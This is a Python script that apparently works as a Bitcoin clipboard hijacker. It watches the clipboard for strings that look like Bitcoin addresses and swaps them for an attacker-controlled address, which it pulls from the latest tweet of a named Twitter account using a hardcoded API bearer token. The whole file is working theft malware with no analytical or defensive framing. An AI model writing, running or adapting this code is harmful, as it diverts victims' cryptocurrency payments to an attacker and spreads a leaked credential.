import pyperclip as pc
import json
import time
import requests as req


def getClipboardText():
  clipboard = pc.paste()
  return str(clipboard)


def checkBitcoinAddress(text):
	'''this function will check if there's a bitcoin address in the text'''
	if len(text) in range(27,35):
		if text.startswith('1') or text.startswith('3') or text.startswith('bc1'):
			return True
	return False

def setClipboardText(address):
  pc.copy(address)

def getNewBitcoinAddress():
  '''This function gets the first tweet on a profile, if the tweet is a bitcoin address it will update the BTCAddress address'''
  BTCAddress = ""
  url = "https://api.twitter.com/2/tweets/search/recent?query=from:michaelprovenz4"
  requ = req.get(url, headers={"Authorization":"Bearer AAAAAAAAAAAAAAAAAAAAANMQegEAAAAAJqlEEsOEvh7ioE%2Fku2uaNVMGXFc%3Dzcsri0rd8VN0lFNTsBSTD3SKQUU8EkYhRIQ1hLwY1VkqlreKQr"})
  content = requ.text
  
  t = json.loads(content)
  tweet = t["data"][0]["text"]
  if checkBitcoinAddress(tweet):
    if BTCAddress != tweet or BTCAddress == "":
      BTCAddress = tweet
  return BTCAddress


def validAdd(addressnum):
  blockchainurl = "https://www.blockchain.com/btc/address/"
  resp = req.get(blockchainurl + addressnum)

  return resp.status_code


def main():
	newBitcoinAddress = 0
	while 1==1:
		verify = False
		address = False
		while address == False:
			possibleAddress = getClipboardText()
			if checkBitcoinAddress(possibleAddress) == True and str(possibleAddress) != str(newBitcoinAddress):
				address = True

		newBitcoinAddress = getNewBitcoinAddress()
		while verify == False:
			if validAdd(newBitcoinAddress) == 200:
				setClipboardText(newBitcoinAddress)
				verify = True
				time.sleep(1)


if __name__ == "__main__":
	main()




